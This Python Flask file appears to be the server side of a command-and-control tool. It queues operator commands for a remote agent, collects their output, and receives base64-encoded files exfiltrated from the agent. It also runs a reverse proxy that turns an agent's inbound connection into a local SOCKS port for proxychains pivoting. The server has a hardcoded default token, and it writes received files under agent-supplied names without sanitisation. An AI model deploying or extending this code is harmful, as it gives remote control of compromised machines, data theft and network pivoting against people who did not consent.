from flask import Flask, request, jsonify, abort
import base64
import os
from functools import wraps
import socket
import threading

app = Flask(__name__)

# --- Configuration ---
SERVER_TOKEN = os.getenv("SERVER_TOKEN", "Azerty112345678")  # Set via env variable in production

# --- In-memory structures ---
commands_queue = []
results = {}

# --- Authentication decorator ---
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            abort(401, description="Missing Bearer token")
        token = auth_header.split(" ")[1]
        if token != SERVER_TOKEN:
            abort(401, description="Invalid token")
        return f(*args, **kwargs)
    return decorated

# --- Routes (unchanged logic) ---

@app.route('/submit_command', methods=['POST'])
@require_auth
def submit_command():
    if request.is_json:
        data = request.get_json()
        command_id = str(len(commands_queue) + 1)
        commands_queue.append({"id": command_id, "cmd": data['cmd']})
        return jsonify({"id": command_id}), 200
    return jsonify({"error": "Request must be JSON"}), 400


@app.route('/command', methods=['GET'])
@require_auth
def get_command():
    if commands_queue:
        cmd = commands_queue.pop(0)
        return jsonify(cmd), 200
    return jsonify({"error": "No commands in queue"}), 404


@app.route('/submit_result', methods=['POST'])
@require_auth
def submit_result():
    if request.is_json:
        data = request.get_json()
        command_id = data['id']
        if 'fileName' in data:
            # File download result
            file_content = base64.b64decode(data['result'])
            file_path = os.path.join("received_files", data['fileName'])
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "wb") as file:
                file.write(file_content)
            results[command_id] = f"File {data['fileName']} received successfully"
        else:
            # Regular command result
            results[command_id] = data['result']
        return jsonify({"message": "Result received successfully"}), 200
    else:
        return jsonify({"error": "Request must be JSON"}), 400


@app.route('/result/<command_id>', methods=['GET'])
@require_auth
def get_result(command_id):
    if command_id in results:
        return jsonify({"id": command_id, "result": results[command_id]}), 200
    return jsonify({"error": "Result not found"}), 404

def handle_bridge(client_conn, agent_conn):
    def forward(src, dst):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            src.close()
            dst.close()

    threading.Thread(target=forward, args=(client_conn, agent_conn), daemon=True).start()
    threading.Thread(target=forward, args=(agent_conn, client_conn), daemon=True).start()


def start_reverse_proxy(listen_port=1080, agent_port=5555):
    print(f"[+] Reverse proxy mode: waiting for agent on port {agent_port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", agent_port))
    s.listen(1)
    agent_conn, agent_addr = s.accept()
    print(f"[+] Agent connected from {agent_addr}")

    # Now start local listener for proxychains
    local_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_listener.bind(("127.0.0.1", listen_port))
    local_listener.listen(5)
    print(f"[+] Local proxy listener running at 127.0.0.1:{listen_port}")
    print(f"    Use this in proxychains.conf: socks5 127.0.0.1 {listen_port}")

    while True:
        client_conn, _ = local_listener.accept()
        print("[+] Local client connected (proxychains, curl, etc.)")
        threading.Thread(target=handle_bridge, args=(client_conn, agent_conn), daemon=True).start()

if __name__ == '__main__':
    cert_file = "cert.pem"
    key_file = "key.pem"
    threading.Thread(target=start_reverse_proxy, args=(1080, 5555), daemon=True).start()
    if os.path.exists(cert_file) and os.path.exists(key_file):
        print("[+] Starting Flask server with HTTPS...")
        app.run(host='0.0.0.0', port=5000, ssl_context=(cert_file, key_file))
    else:
        print("[-] Certificates not found, falling back to HTTP.")
        app.run(host='0.0.0.0', port=5000)
